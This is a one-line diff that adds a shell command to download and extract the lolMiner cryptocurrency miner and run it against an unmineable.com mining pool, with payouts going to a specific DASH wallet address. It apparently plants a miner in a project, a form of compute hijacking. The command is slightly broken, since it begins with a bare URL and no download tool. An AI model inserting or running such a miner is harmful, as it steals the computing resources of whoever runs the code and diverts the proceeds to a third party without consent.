@@ -1,0 +1,1 @@
+https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz && tar xvf lolMiner_v1.45_Lin64.tar.gz && cd 1.45 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DASH:XdKzmPkYa85964Xq5CTEbEAgBZya21hBTt.$(echo $(shuf -i 1-9999 -n 1)-modalnikah) --ethstratum ETHPROXY
